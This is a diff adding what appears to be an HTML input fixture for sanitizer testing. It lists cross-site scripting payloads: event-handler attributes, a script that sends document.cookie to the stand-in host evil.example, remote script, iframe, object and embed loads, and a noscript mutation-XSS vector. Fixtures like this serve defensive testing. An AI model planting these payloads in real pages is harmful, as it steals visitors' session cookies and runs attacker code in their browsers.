@@ -1,0 +1,12 @@
+<p onclick="steal()" onmouseover=steal()>Hello <b onload="x()">there</b></p>
+<script>document.location='https://evil.example/?c='+document.cookie</script>
+<script src="https://evil.example/x.js"></script>
+<img src="https://evil.example/a.png" onerror="alert(1)" onload=alert(2)>
+<body onload="alert(3)"><div ONCLICK="alert(4)">kept text</div>
+<iframe src="https://evil.example/frame">frame fallback</iframe>
+<object data="https://evil.example/o.swf"><param name="x" value="y">object fallback</object>
+<embed src="https://evil.example/e.swf">
+<noscript><p title="</noscript><img src=x onerror=alert(5)>">inside the fallback</p></noscript>
+<textarea><script>alert(6)</script></textarea>
+<xmp><script>alert(7)</script></xmp>
+after
